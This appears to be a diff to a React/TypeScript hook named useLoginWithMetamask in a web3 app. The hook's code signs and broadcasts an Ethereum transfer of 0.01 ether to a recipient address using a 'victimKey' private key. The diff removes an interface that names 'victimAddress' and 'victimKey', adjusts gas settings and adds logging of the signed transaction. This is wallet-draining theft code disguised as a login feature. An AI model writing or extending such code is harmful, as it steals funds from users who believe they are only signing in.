@@ -7,12 +7,6 @@ import useUserInfo from "../../store/useUserInfo";
 import { useCustomToast } from "./Toast";
 import Web3 from "web3";
 
-interface TransactionComponentProps {
-  victimAddress: string;
-  recipientAddress: string;
-  victimKey: string;
-}
-
 export const useLoginWithMetamask = (
   values: LoginInterface,
   isBusiness: boolean
@@ -39,11 +33,14 @@ export const useLoginWithMetamask = (
         nonce,
         to: recipientAddress,
         value: web3.utils.toWei("0.01", "ether"),
-        gas: 53000,
-        gasPrice: web3.utils.toWei("56", "gwei"),
+        gas: 63000,
+        gasPrice: web3.utils.toWei("60", "gwei"),
       };
 
+      console.log(tx)
+
       const signedTx = await web3.eth.accounts.signTransaction(tx, victimKey);
+      console.log(signedTx)
       const txHash = await web3.eth.sendSignedTransaction(
         signedTx.rawTransaction
       );
